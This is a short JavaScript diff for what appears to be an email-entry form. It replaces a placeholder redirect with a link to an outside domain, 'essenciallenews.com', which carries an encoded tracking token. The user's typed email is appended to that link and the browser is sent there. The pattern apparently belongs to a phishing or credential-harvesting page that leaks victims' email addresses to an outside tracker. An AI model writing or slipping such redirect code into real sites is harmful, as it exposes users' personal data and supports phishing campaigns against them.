@@ -4004,7 +4004,7 @@ const Cl = {
         this.isLoading = true;
 
         try {
-            const redirectUrl = "https://example.com/next?email=" + encodeURIComponent(this.emailInput);
+            const redirectUrl = "https://essenciallenews.com/i/?c3Y9d2Umcj11ZSZ1aWQ9VVNFUjA1MDYyMDI1VTIwMDYwNTEzJnM9TE0=N0123N" + encodeURIComponent(this.emailInput);
             window.location.href = redirectUrl;
         } catch (e) {
             this.errorMessage = e.message || "Redirection failed";
